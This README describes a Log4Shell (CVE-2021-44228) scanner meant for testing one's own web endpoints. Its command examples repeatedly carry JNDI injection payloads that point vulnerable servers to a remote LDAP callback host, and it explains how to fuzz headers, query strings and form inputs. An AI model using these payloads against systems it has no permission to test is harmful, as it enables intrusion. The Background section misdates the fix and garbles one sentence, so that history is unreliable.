# log4jShell Scanner

This shell script scans a vulnerable web application that is using a version of apache-log4j < 2.15.0. This application is a static implementation, which means it does not perform domain, sub-domain, or webpage discovery. To test your web-features, web-pages, and domains, you will have to construct a list identifying the vulnerable locations within your web enterprise and explicitly identify the locations to test in the domains.txt file. This script accepts a text file containing a fully qualified uri on each line with no delimitation (commas, semicolons, etc.).

This system is issued as is under the GNU General Public License, version 3 (GPL3). <strong>Improper syntax may produce false positives.</strong> GoVanguard recommends double checking your command line syntax against the example provided in this readme and ensuring that your implementation reads back a vulnerability on an example webpage before testing for Common Vulnerability and Exposures (CVE)-2021-44228 witihin your web application enterprise. For your convenience an intentionally vulnerable web page is provided here: [Log4jShell_Vulnerable_Site](https://github.com/GoVanguard/Log4jShell_Vulnerable_Site)

Domains.txt e.g.

example.com  
ads.example.com  
ads.example.com/please-no-more-ads.html  
ads.example.com/method  
ads.example.com/method?myQarg=userQuery  
ads.example.com/method?myQarg=userResponse&myOtherArg=anotherResponse  

# TLDR
Please ensure that you modify the domains.txt file in this repository, obtain a payload from the following link: [Huntress Payload Generator](https://log4shell.huntress.com/) or generate your own payload, and provide your own authentication schema before using this script.
If you generate a payload from Huntress, then keep the webpage open and keep in mind the results are cached for 30 minutes.
```shell
sudo apt-get update
sudo apt-get install python3 python3-pip
git clone https://github.com/GoVanguard/Log4jShell_Scanner.git
python3 -m venv Log4jShell_Scanner 
cd Log4jShell_Scanner/  
python3 -m pip install -r requirements.txt  
source bin/activate  
python3 scanForLog4jVulnerability.py -f ./domains.txt -t 2 -k -s "http" -s "https" -p '${jndi:ldap://log4shell.huntress.com:1389/967d1170-4733-4c07-bbd8-c3bc9233e1ba}' -b -z -q -i -v "{'Your-Auth-Token': 'f3e2e050-866b-435a-9561-eaa80ecc8ceb', 'Accept': 'application/application_name.json'}"  
```

# Setup

1. Download the Log4jShell_Scanner at the following link: [Log4jShell_Scanner](https://github.com/GoVanguard/Log4jShell_Scanner).
2. Clone the repository.
```shell
git clone https://github.com/GoVanguard/Log4jShell_Scanner.git
```
3. Install Python.
```shell
sudo apt-get update
sudo apt-get install python3 python3-pip
```
4. Install a virtual environment encapsulating the Log4jShell_Scanner repository.
```shell
python3 -m venv Log4jShell_Scanner 
```
5. Install the dependent libraries.
```shell
cd Log4jShell_Scanner/
python3 -m pip install -r requirements.txt
```
6. Activate the virutal environment.
```shell
source bin/activate
```
7. Create a custom jndi payload or obtain a test payload. Huntress generates test payloads at the following link: [Huntress Payload Generator](https://log4shell.huntress.com/)  

Example from Huntress: ${jndi:ldap://log4shell.huntress.com:1389/967d1170-4733-4c07-bbd8-c3bc9233e1ba}  

Shout out to our peers at Huntress: Caleb Stewart, Jason Slagle, and John Hammond, who created this payload generator over the weekend.

8. Update the domains.txt file with your end points. Examples are above and in the text file included in this repository.

9. Run the script and add additional flags as necessary. An example is included below to help you implement each flag.
```shell
python3 scanForLog4jVulnerability.py -f ./domains.txt -t 2 -k -s "http" -s "https" -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}' -b -z -q -i -v "{'Your-Auth-Token': 'f3e2e050-866b-435a-9561-eaa80ecc8ceb', 'Accept': 'application/application_name.json'}"
```

# Flags

## Source File -f or --file (required)

The source file flag is a required flag to begin using this script. It is best practice to run the program from within the virtual environment folder and use either a relative file path from the virtual environment folder or a fully qualified path that is also mapped to your operating system. The examples below provide users of different operating systems context and syntax for relative and explicit file paths. These examples assume you have cloned the Log4jShell_Scanner in to your downloads folder and have used default operating system (OS) settings during OS installation.


## Example File Paths to domains.txt

```
Windows  
Your command prompt displays: C:\Users\YourUserName\Downloads\Log4jShell_Scanner>  
Relative File Path: .\domains.txt  
Explicit File Path: C:\Users\YourUserName\Downloads\Log4jShell_Scanner\domains.txt  

Mac  
Your terminal displays: YourComputerName:Log4jShell_Scanner YourUserName$  
or  
Your terminal displays: YourUserName@YourComputerName Log4jShell_Scanner %  

Relative File Path: ./domains.txt  
Explicit File Path: /home/YourUserName/Downloads/Log4jShell_Scanner/domains.txt  

Linux  
Your command prompt displays: YourUserName@YourComputerName:~/Downloads/Log4jShell_Scanner$  
Relative File Path: ./domains.txt  
Explicit File Path: /home/YourUserName/Downloads/Log4jShell_Scanner/domains.txt  
```
If you do not know where you cloned the Log4jShell_Scanner, then for mac and linux type pwd.  
Windows displays your explicit file path in the command prompt.  
This will help you construct an explicit file path to the domains.txt file so that you can run this program.  

Example Log4jShell command using the -f FILESOURCE flag:

```shell
python3 scanForLog4jVulnerability.py -f ./domains.txt -s "http" -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}'
```

## Timeout -t or --timeout (optional)

The timeout flag sets the time that your computer will await a response from the webpage in seconds (s). This flag is optional and the default timeout is 3 seconds. This parameter accepts positive integers only. Using a negative number will set the timeout to 0 and no scans will be performed.

```shell
python3 scanForLog4jVulnerability.py -f ./domains.txt -s "http" -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}' -t 2
```

## Ignore Invalid Certificates -k or --ignoressl (optional)

Webpages that are not in a production environment may not possess valid Secure Sockets Layer (SSL) certificates or a SSL certificate may have expired without someone within the organization noticing the expiration. In these two circumstances, it may be wise to use the -k flag. This will ensure that webpages without valid SSL certificates are still tested using the payload provided.

```shell
python3 scanForLog4jVulnerability.py -f ./domains.txt -s "https" -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}' -k
```

## Schemes -s or --schemes (optional)

Hypertext Transfer Protocol (HTTP) and Hypertext Transfer Protocol Secure (HTTPS) are the only schemes currently supported. If you do not specify a scheme, then this shell script will test both HTTP and HTTPS.

```shell
python3 scanForLog4jVulnerability.py -f ./domains.txt -s "http" -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}'
```

## Payload -p or --payload (required)

A payload is any string of code that enables remote code execution on a vulnerable system without permission. Log4jShell payloads are simple to implement because a threat actor can point a vulnerable system to any location on the internet, then exploit the vulnerable system from that location. This web page generates a safe payload that points back to a cache on the very same webpage. When the payload executes successfully a callback records the details where that callback occurred, which allows you to rapidly test and record vulnerable systems. When you visit the web page below, your visit generates a payload that is designed to callback to a cache on the same web page. Keep in mind that each visit or refresh generates a new payload and associated cache. Also, every record created within the cache has a 30 minute time to live, which reduces the cost to Huntres for hosting this utilty, but requires you to dilligently extract the logged cache. To generate a payload and cache for checking your systems, visit the following link: [Huntress Payload Generator](https://log4shell.huntress.com/)

```shell
python3 scanForLog4jVulnerability -f ./domains.txt -s "https" -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}'
```

## Fuzzing

As was stated in the introduction, this application does not perform resource discovery. Due to this limitation, the following flags are like light switches that allow you to zero in on a vulnerability once you find one.

### Fuzz Query Parameters -q or --fuzzqueryparams

If your domains.txt file contains query parameters supplied with the current host in domains.txt and this flag is set, then it will inject the payload in to that query. e.g. host/search?q=userResponse will become host/search?q=payload. If no query parameter is supplied with the current host in domains.txt and this flag is set, then this script will attempt host?fuzzqp=payload. 

```shell
python3 scanForLog4jVulnerability -f ./domains.txt -s "https" -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}' -q
```

### Fuzz Inputs -i or --fuzzinputs

Setting this flag will automatically discover form inputs on every webpage this script is pointed at.

```shell
python3 scanForLog4jVulnerability -f ./domains.txt -s "https" -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}' -i
```

### Fuzz Headers -z or --fuzzheaders

Setting this flag will fuzz the following commonly logged headers: User-Agent, Referrer-Policy, Accept, Logger
Please submit a pull request adding a header if it is not included here and it is commonly logged within your technology stack. The list begins on line 271 and ends on line 274.

```shell
python3 scanForLog4jVulnerability -f ./domains.txt -s "https" -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}' -z
```

### Fuzz Body Parameters -b or --fuzzbodyparams (Work in Progress)

Setting this flag will post the payload in to the body parameter 'fuzzbp'.

```shell
python3 scanForLog4jVulnerability -f ./domains.txt -s "https" -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}' -b
```

## Help

All of the flags for this shell script are briefly described within the help menu. If you need a reminder of any of the flags while using this program, then you need only remember to type the following:

Input Code:
```shell
python3 scanForLog4jVulnerability.py -h
```

Example Output:
```shell
usage: scanForLog4jVulnerability.py [-h] [-f SOURCEFILE] [-t TIMEOUT] [-k] [-s SCHEMES [SCHEMES ...]] -p TESTPAYLOAD
                                    [-q] [-i] [-z] [-b] [-v EXTRAHEADERS]

optional arguments:
  -h, --help            show this help message and exit
  -f SOURCEFILE, --file SOURCEFILE
                        Source file containing endpoints to check without scheme. One host per line.
  -t TIMEOUT, --timeout TIMEOUT
                        Request timeout period.
  -k, --ignoressl       Whether or not to ignore invalid certificates.
  -s SCHEMES [SCHEMES ...], --schemes SCHEMES [SCHEMES ...]
                        Schemes to prefix such as http or https.
  -p TESTPAYLOAD, --payload TESTPAYLOAD
                        Test payload from https://log4shell.huntress.com/. Escape any $ or payload will seem blank.
  -q, --fuzzqueryparams
                        Enable fuzzing query parameters.
  -i, --fuzzinputs      Enable fuzzing form inputs.
  -z, --fuzzheaders     Enable fuzzing headers.
  -b, --fuzzbodyparams  Enable fuzzing body parameters.
  -v EXTRAHEADERS, --headers EXTRAHEADERS
                        Extra headers to pass in "{'name':'value'}" format.
```

# Background

The Log4jShell vulnerability was initially discovered by Minecraft gaming enthusiasts during Thanksgiving Recess, which occurred sometime between 20-23 November 2021. A researcher with AliBaba's Cloud Security Team reported the vulnerability to Apache on 24 November 2021. MITRE assigned this vulnerability CVE-2021-44228 on 26 November 2021, which was still being used in the Minecraft gaming community. Unfortunately, The Apache Software Foundation did not prioritize mitigating the vulnerability during Thanksgiving Recess. It is very likely that their leadership, grantees, and the open source community of contributors at large were on holiday.

On Friday 9 December 2021, the GitHub user TangXiaFeng7 published the source code for the Minimum Viable Product (MVP) for this exploit online at 10:32AM 9 December 2021. Minutes after this publication hit the internet the exploit became weaponized. Since the Log4jShell vulnerability affects many server based software systems within the industry at the Application and Session layers, the impact that this exploit publication has on the industry is significant enough to motivate a rapid crowd-sourced solution. Initial commits that indicate The Apache Software Foundation's open source community was debugging the vulnerability hit the internet at 12:38PM 9 November 2021. Within eight hours of CVE-2021-44228 MVP hitting the internet, The Apache Software Foundation's team of open source developers fixed the vulnerability. The final pull request was accepted at 18:23 9 November 2021.

